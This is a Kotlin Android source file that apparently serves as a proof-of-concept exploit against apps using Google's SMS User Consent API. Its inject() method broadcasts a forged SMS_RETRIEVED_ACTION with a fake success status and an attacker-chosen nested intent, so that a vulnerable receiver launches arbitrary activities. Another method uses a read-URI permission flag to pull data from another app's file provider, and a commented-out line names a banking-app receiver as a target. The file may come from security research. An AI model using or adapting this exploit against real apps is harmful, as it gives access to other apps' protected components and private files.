package bar.gtfo.intent_injector.intent

import android.content.Intent
import android.net.Uri
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import com.google.android.gms.auth.api.phone.SmsRetriever
import com.google.android.gms.common.api.CommonStatusCodes
import com.google.android.gms.common.api.Status

class IntentSender(private val mainActivity: ComponentActivity) {

    private val smsRequestLauncher = mainActivity.registerForActivityResult(SmsConsentContract()) {
        it?.let { sms -> smsResultListener(sms) }
    }

    private fun smsResultListener(sms: String) {
        Toast.makeText(mainActivity, sms, Toast.LENGTH_LONG).show()
    }

    fun proxySmsRetreiverIntent(intent: Intent) {
        Log.i(mainActivity.packageName, "Trying to extract nested intent from ${intent}}")
        if (SmsRetriever.SMS_RETRIEVED_ACTION == intent.action) {
            val extras = intent.extras
            val smsRetrieverStatus = extras?.get(SmsRetriever.EXTRA_STATUS) as Status

            when (smsRetrieverStatus.statusCode) {

                CommonStatusCodes.SUCCESS -> {
                    extras.getParcelable<Intent>(SmsRetriever.EXTRA_CONSENT_INTENT)?.let {
                        launchSmsRequest(it)
                        Log.i(mainActivity.packageName, "Success. Launching activity ${it}")
                    }
                }
            }
        }
    }

    fun queryFileProvider(uri: String) {
        Intent().apply {
            flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
            setClassName(mainActivity.packageName, "bar.gtfo.intent_injector.FishingActivity")
            data = Uri.parse(uri)
        }.also{
            inject(it)
        }
    }

    private fun launchSmsRequest(intent: Intent?) {
        smsRequestLauncher.launch(intent)
    }

    fun injectActivity(packageName: String, className: String) {
        Intent().apply {
            setClassName(packageName, className)
        }.also {
            inject(it)
        }
    }

    fun inject(extra: Intent) {
        Intent().apply{
            action = SmsRetriever.SMS_RETRIEVED_ACTION
            putExtra(SmsRetriever.EXTRA_CONSENT_INTENT, extra)
            putExtra(SmsRetriever.EXTRA_STATUS, Status(CommonStatusCodes.SUCCESS))
            // setClassName("bar.gtfo.bankintent", "bar.gtfo.bankintent.SmsUserConsentReceiver")
        }.also {
            mainActivity.sendBroadcast(it)
        }
    }
}